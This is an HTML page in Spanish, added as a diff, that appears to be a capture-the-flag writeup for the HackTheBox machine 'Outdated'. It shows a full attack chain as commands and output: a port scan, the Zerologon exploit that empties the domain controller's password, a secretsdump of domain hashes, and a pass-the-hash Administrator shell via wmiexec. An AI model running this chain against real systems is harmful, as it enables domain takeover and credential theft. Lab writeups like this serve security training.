@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Outdated HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/outdated.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Outdated HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Outdated de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Outdated de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Outdated HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Outdated HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Outdated de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Outdated HackTheBox</h1>
+          <p>Resolución de la máquina Outdated de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -Pn 10.10.11.175
+Nmap scan report for 10.10.11.175
+PORT      STATE SERVICE
+25/tcp    open  smtp
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+50006/tcp open  unknown</span>
+</code></pre></div></div>
+
+<div><p>En este caso explotaremos una via probablemente no intencional con zerologon</p></div>
+
+<div><p>Descargamos el <a href="https://github.com/risksense/zerologon">exploit</a> y lo ejecutamos pasandole un nombre y la ip víctima</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> set_empty_pw.py dc 10.10.11.175
+Performing authentication attempts...
+=======
+
+NetrServerAuthenticate3Response
+ServerCredential:
+Data:                            b'\xd7\x93\xa6\x1d\xe7\x1c\xbeu'
+NegotiateFlags:                  556793855
+AccountRid:                      1002
+ErrorCode:                       0
+server challenge b'\xd7\x9b$\x14\xbc\x91\xf7\x83'
+NetrServerPasswordSet2Response
+ReturnAuthenticator:
+Credential:
+Data:                            b'\x014\x1d\x97\xb078;'
+Timestamp:                       0
+ErrorCode:                       0
+
+Success! DC should now have the empty string as its machine password.</span>
+</code></pre></div></div>
+
+<div><p>Como la contraseña ha sido removida podemos dumpear hashes con secretsdump</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-secretsdump </span><span class="p">-just-dc -no-pass </span><span class="no">'DC$@10.10.11.175'</span><span class="p">
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee</span><span class="kd">:716f1ce2e2cf38ee1210cce35eb78cb6</span><span class="p">:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a300e4031093085c7af7ac61a79e6d00:::
+outdated.htb\btables:1106:aad3b435b51404eeaad3b435b51404ee:781444163f086fdf8de13de9110ed6e7:::
+outdated.htb\sflowers:1108:aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CLIENT$:1105:aad3b435b51404eeaad3b435b51404ee:c57f6ab8490903d04597f6ff606fc58b:::</span>
+</code></pre></div></div>
+
+<div><p>Con el hash ahora nos conectamos con wmiexec y somos Administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-wmiexec </span><span class="p">WORKGROUP/Administrator@10.10.11.175 -hashes :716f1ce2e2cf38ee1210cce35eb78cb6
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+C:\> </span><span class="no">whoami</span><span class="p">
+outdated\administrator
+
+C:\> </span><span class="no">cd C:\Users</span><span class="p">
+
+C:\Users> </span><span class="no">dir</span><span class="p">
+ Volume in drive C has no label.
+ Volume Serial Number is 2170-25D8
+
+ Directory of C:\Users
+
+06/15/2022  10:48 PM    &ltDIR>          .
+06/15/2022  10:48 PM    &ltDIR>          ..
+06/15/2022  07:33 AM    &ltDIR>          .NET v4.5
+06/15/2022  07:33 AM    &ltDIR>          .NET v4.5 Classic
+06/14/2022  10:29 AM    &ltDIR>          Administrator
+06/14/2022  10:29 AM    &ltDIR>          Public
+06/15/2022  10:48 PM    &ltDIR>          sflowers
+               0 File(s)              0 bytes
+               7 Dir(s)   8,944,898,048 bytes free
+
+C:\Users> </span><span class="no">type C:\Users\sflowers\Desktop\user.txt</span><span class="p">
+6b7**************************dfe
+
+C:\Users></span><span class="no"> type C:\Users\Administrator\Desktop\root.txt</span><span class="p">
+2e1**************************12a
+
+C:\Users></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
